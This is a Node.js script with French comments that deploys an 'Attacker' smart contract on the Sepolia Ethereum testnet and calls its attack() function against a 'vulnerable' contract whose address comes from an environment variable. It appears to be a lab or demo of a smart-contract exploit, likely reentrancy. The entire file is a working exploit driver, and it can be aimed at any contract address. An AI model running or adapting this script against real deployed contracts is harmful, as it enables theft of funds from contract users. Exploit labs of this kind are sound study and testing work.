require('dotenv').config();
const Web3 = require('web3');
const fs = require('fs');
const path = require('path');

const web3 = new Web3(`https://sepolia.infura.io/v3/${process.env.INFURA_PROJECT_ID}`);
const account = web3.eth.accounts.privateKeyToAccount(process.env.ATTACKER_PRIVATE_KEY);
web3.eth.accounts.wallet.add(account);

const vulnerableContractABI = JSON.parse(fs.readFileSync(path.join(__dirname, '../build/VulnerableContractABI.json')));
const vulnerableContractAddress = process.env.VULNERABLE_CONTRACT_ADDRESS;

const attackerContractABI = JSON.parse(fs.readFileSync(path.join(__dirname, '../build/AttackerABI.json')));
const attackerBytecode = fs.readFileSync(path.join(__dirname, '../build/AttackerBytecode.txt')).toString();

// Instance du contrat vulnérable
const vulnerableContract = new web3.eth.Contract(vulnerableContractABI, vulnerableContractAddress);

async function deployAttacker() {
    console.log("Déploiement du contrat Attacker...");

    const deployTx = new web3.eth.Contract(attackerContractABI)
        .deploy({ data: attackerBytecode, arguments: [vulnerableContractAddress] });

    const gas = await deployTx.estimateGas({ from: account.address });
    const deploy = await deployTx.send({ from: account.address, gas });

    console.log(`Contrat Attacker déployé à : ${deploy.options.address}`);
    return deploy.options.address;
}

async function executeAttack(attackerAddress) {
    console.log("⚡ Lancement de l'attaque...");

    const attackerContract = new web3.eth.Contract(attackerContractABI, attackerAddress);
    
    // Attaque : dépôt initial puis exploitation de la faille
    const tx = await attackerContract.methods.attack().send({
        from: account.address,
        value: web3.utils.toWei("0.01", "ether"),
        gas: 3000000
    });

    console.log("Attaque exécutée avec succès !");
    console.log("Transaction Hash : ", tx.transactionHash);
}

async function main() {
    try {
        const attackerAddress = await deployAttacker();
        await executeAttack(attackerAddress);
    } catch (error) {
        console.error("Erreur lors de l'attaque :", error);
    }
}

main();
